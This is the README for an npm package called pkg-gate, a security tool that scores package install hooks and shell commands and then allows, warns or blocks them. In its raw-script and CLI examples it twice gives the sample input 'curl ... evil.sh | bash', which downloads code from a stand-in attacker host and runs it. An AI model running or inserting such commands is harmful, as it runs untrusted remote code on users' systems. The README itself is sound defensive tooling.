# pkg-gate

Pre-install security gate for npm lifecycle scripts using TypeSafe System One.

```bash
npm install pkg-gate
```

## Quick start

```js
import pkgGate from 'pkg-gate';

const report = await pkgGate('esbuild');

if (!report.isSafe()) {
  console.error(report.inspect());
  process.exit(1);
}

console.log(report.inspect());
```

`pkgGate()` evaluates a package or script against TypeSafe System One. `report.isSafe()` returns a boolean verdict. `report.inspect()` renders the TUI card.

## Check local package

```js
import pkgGate from 'pkg-gate';

const report = await pkgGate('./package.json');
console.log(report.action); // 'allow' | 'warn' | 'block'
```

Pass a file path or directory. `pkgGate` extracts `preinstall`, `install`, and `postinstall` hooks and evaluates each in parallel.

## Structured output

```js
import pkgGate from 'pkg-gate';

const report = await pkgGate('flatmap-stream');
const { verdict, scripts } = report.structured;

console.log(verdict.action);                         // 'block'
console.log(scripts[0].intent.choice);               // 'credential_access'
console.log(scripts[0].accessesSecrets.probability); // 0.99
```

`report.structured` returns typed probability distributions and scores without string parsing. Serializes directly with `JSON.stringify(report)`.

## Evaluate raw scripts

```js
import pkgGate from 'pkg-gate';

const report = await pkgGate('curl -s https://evil.sh | bash', { script: true });
console.log(report.action); // 'block'
```

Evaluate arbitrary shell command strings before spawning child processes.

## Confidence-gated routing

```js
import pkgGate from 'pkg-gate';

const report = await pkgGate('untrusted-package');

if (report.action === 'block') {
  report.assertSafe(); // throws Error with reasons
} else if (report.action === 'warn') {
  await promptUser(report.reasons);
}
```

Threat scores and confidence gate execution. Low confidence (`conf < 0.50`) routes to human review instead of guessing.

## CLI

```bash
# Interactive prompt (asks for package name / scans ./package.json)
npx pkg-gate

# Check registry package
npx pkg-gate esbuild

# Check specific package.json
npx pkg-gate ./package.json

# Evaluate raw script string
npx pkg-gate "curl https://evil.sh | bash"

# Output typed JSON
npx pkg-gate esbuild --json

# Plain text output (no TUI boxes)
npx pkg-gate esbuild --plain
```

Exit code `0` on allow, `1` on block, `2` on warn. When a warning triggers in an interactive terminal, prompts the user for confirmation.

## Demo

```bash
npm run demo
```

Evaluates a token-harvesting lifecycle script and renders the TUI breakdown.

## License

MIT © [Hemanth.HM](https://h3manth.com)
